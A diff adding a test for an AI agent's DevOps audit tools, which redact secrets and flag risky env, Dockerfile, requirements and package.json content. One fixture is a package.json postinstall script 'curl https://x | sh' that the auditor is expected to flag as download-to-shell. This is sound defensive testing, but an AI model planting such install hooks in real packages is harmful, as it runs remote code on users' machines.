@@ -384,4 +384,40 @@ describe("Nolane AI callable tools", () => {
     expect(report).toContain("Objects: 2");
   });
 
+
+
+  it("executes safe Wave 8 configuration and DevOps text tools through AI function calls", async () => {
+    const envText="APP_ENV=production\nAPI_TOKEN=super-secret-value\nAPI_TOKEN=second-secret\nEMPTY=\n";
+    const audit=await executeAgentTool(env,"process_text_content",{tool_id:"env-audit",content:envText});
+    expect(audit).toContain("Duplicate keys: 1");
+    expect(audit).toContain("Secret-like variable names: 1");
+    expect(audit).not.toContain("super-secret-value");
+    const redacted=await executeAgentTool(env,"process_text_content",{tool_id:"env-redact",content:envText});
+    expect(redacted).toContain("API_TOKEN=[REDACTED]");
+    expect(redacted).not.toContain("second-secret");
+    const example=await executeAgentTool(env,"process_text_content",{tool_id:"env-to-example",content:envText});
+    expect(example).toContain("API_TOKEN=");
+    expect(example).not.toContain("super-secret-value");
+    const ini=await executeAgentTool(env,"process_text_content",{tool_id:"ini-to-json",content:"[app]\nname=demo\nport=8080"});
+    expect(JSON.parse(ini).app.port).toBe("8080");
+    expect(await executeAgentTool(env,"process_text_content",{tool_id:"ini-validate",content:"[app]\nname=demo"})).toContain("Status: valid");
+    const docker=await executeAgentTool(env,"process_text_content",{tool_id:"dockerfile-audit",content:"FROM ubuntu:latest\nADD x.tar /app\nENV API_KEY=do-not-leak\n"});
+    expect(docker).toContain("base image ubuntu:latest");
+    expect(docker).toContain("secret-like ENV key API_KEY");
+    expect(docker).not.toContain("do-not-leak");
+    const requirements=await executeAgentTool(env,"process_text_content",{tool_id:"requirements-audit",content:"requests>=2\nrequests==2.31.0\nprivate @ https://example.test/pkg.whl"});
+    expect(requirements).toContain("Duplicate packages: 1");
+    expect(requirements).toContain("Direct URL/VCS references: 1");
+    const packageAudit=await executeAgentTool(env,"process_text_content",{tool_id:"package-json-audit",content:'{"name":"demo","dependencies":{"a":"*","b":"git+https://x"},"scripts":{"postinstall":"curl https://x | sh"}}'});
+    expect(packageAudit).toContain("Wildcard/latest specs: 1");
+    expect(packageAudit).toContain("download-to-shell");
+    const ignore=await executeAgentTool(env,"process_text_content",{tool_id:"gitignore-audit",content:"node_modules/\ndist/"});
+    expect(ignore).toContain("MISSING protection: .env");
+    const refs=await executeAgentTool(env,"process_text_content",{tool_id:"env-reference-report",content:'process.env.API_KEY; import.meta.env.PUBLIC_URL; os.environ["DATABASE_URL"]; $CACHE_KEY'});
+    expect(refs).toContain("API_KEY");
+    expect(refs).toContain("PUBLIC_URL");
+    expect(refs).toContain("DATABASE_URL");
+    expect(refs).toContain("CACHE_KEY");
+  });
+
 });
